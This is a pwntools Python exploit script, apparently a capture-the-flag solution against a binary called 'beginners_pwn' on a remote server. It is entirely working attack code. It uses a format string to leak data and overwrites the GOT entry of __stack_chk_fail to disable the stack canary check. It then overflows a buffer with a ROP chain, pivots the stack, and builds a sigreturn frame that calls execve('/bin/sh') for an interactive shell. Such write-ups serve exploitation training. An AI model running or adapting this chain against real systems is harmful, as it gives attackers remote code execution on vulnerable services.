from pwn import *
import time


binpath = './beginners_pwn'
elf = ELF(binpath)
libc = elf.libc

context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']

# return from readn
# b *0x0000000000401202
# ret just before srop
# b *0x0000000000401202
gdbscript = '''
gef
# rop
# b *0x401256
# scanf
# b *0x0000000000401040
# ignore 2 2
# syscall
# b *0x000000000040118f
# ignore 3 350
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)
io = remote('35.221.81.216', 30002)

# input()
payload = b''
payload += b'%8$s%1$s'
payload += b'A' * (0x10 - len(payload))
payload += p64(elf.got['__stack_chk_fail'])
payload += b'B' * (0x18 - len(payload))
io.send(payload)

# overwrite GOT entry of __stack_chk_fail to ret
# neutralize stack smashing detection
addr_ret = 0x000000000040101a
payload = b''
payload += p64(addr_ret)[:7]
io.sendline(payload)
time.sleep(0.2)

addr_pop_rdi = 0x00000000004012c3
addr_pop_rsi_r15 = 0x00000000004012c1
addr_pop_rbp = 0x000000000040112d
addr_leave = 0x0000000000401201
addr_syscall = 0x000000000040118f

addr_format = 0x0000000000404000 + 0x50
addr_int = addr_format + 0x80
addr_binsh = 0x0000000000404000 + 0x150
addr_pivot = 0x0000000000404000 + 0xd00
addr_new_rbp = 0x0000000000404000 + 0xf00
# bof
payload = b'C'
payload += p64(0xdeadbeefcafebabe)  # fake stack canary
payload += p64(0xdeadbeefcafebabe)  # fake rbp
# rop
# readn(addr_pivot, 0x800)
payload += p64(addr_pop_rdi)
payload += p64(addr_pivot)
payload += p64(addr_pop_rsi_r15)
payload += p64(0x800)
payload += p64(0xdeadbeefcafebabe)
payload += p64(elf.symbols['readn'])  # <-- A
# readn(addr_format, 0x800)
payload += p64(addr_pop_rdi)
payload += p64(addr_format)
payload += p64(addr_pop_rsi_r15)
payload += p64(0x800)
payload += p64(0xdeadbeefcafebabe)
payload += p64(elf.symbols['readn'])  # <-- B
# readn(addr_binsh, 0x800)
payload += p64(addr_pop_rdi)
payload += p64(addr_binsh)
payload += p64(addr_pop_rsi_r15)
payload += p64(0x800)
payload += p64(0xdeadbeefcafebabe)
payload += p64(elf.symbols['readn'])  # <-- C
# stack pivot
payload += p64(addr_pop_rbp)
payload += p64(addr_pivot - 0x8)
payload += p64(addr_leave)
io.sendline(payload)
time.sleep(0.2)

# send main ROP
payload = b''
# set new rbp
payload += p64(addr_pop_rbp)
payload += p64(addr_new_rbp)
# scanf(addr_format, addr_format + 0x30)
payload += p64(addr_pop_rdi)
payload += p64(addr_format)
payload += p64(addr_pop_rsi_r15)
payload += p64(addr_int)
payload += p64(0xdeadbeefcafebabe)
payload += p64(addr_ret)
payload += p64(elf.plt['__isoc99_scanf'])  # <-- D_0 ~ D_14
payload += p64(addr_syscall)
payload += b'BBBBBBBB' * 5  # PADDING!!
# SROP
fake_frame = b''
fake_frame += p64(0) * 8  # r8-r15
fake_frame += p64(addr_binsh)  # rdi
fake_frame += p64(0)  # rsi
fake_frame += p64(0)  # rbp
fake_frame += p64(0)  # rbx
fake_frame += p64(0)  # rdx
fake_frame += p64(59)  # rax
fake_frame += p64(0)  # rcx
fake_frame += p64(0xdeadbeefcafebabe)  # rsp
fake_frame += p64(addr_syscall)  # rip
fake_frame += p64(0)  # eflags
fake_frame += p64(0x33)  # csgsfs
fake_frame += b'AAAAAAAA' * 4
fake_frame += p64(0)  # &fpstate
payload += fake_frame
io.sendline(payload)  # --> A
time.sleep(0.2)

payload = b''
# format string
for i in range(15):
    payload += b'%1$d'
io.sendline(payload)  # --> B
time.sleep(0.2)

payload = b''
payload += b'/bin/sh'
io.sendline(payload)  # --> C
time.sleep(0.2)

# send integers to scanf so that it will return 15 to rax
for i in range(15):
    io.sendline(b'1')  # --> D_0 ~ D_14
    time.sleep(0.2)

io.interactive()
